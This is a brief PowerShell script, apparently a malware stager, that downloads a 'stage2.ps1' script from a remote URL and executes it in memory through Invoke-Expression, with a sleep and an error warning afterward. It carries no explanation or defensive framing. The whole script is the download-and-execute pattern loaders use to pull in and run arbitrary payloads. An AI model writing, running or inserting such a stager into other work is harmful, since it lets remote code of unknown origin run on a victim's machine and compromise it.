
<# Remote fetch #>
[CmdletBinding()]
param(
    [string]$TransferUrl = 'http://contoso.com/stage2.ps1',
    [int]$StageTimeout = 83
)
try { IEX (Invoke-WebRequest -Uri $TransferUrl -UseBasicParsing).Content; Start-Sleep -Seconds 29 } catch { Write-Warning "Stage transfer failed" }
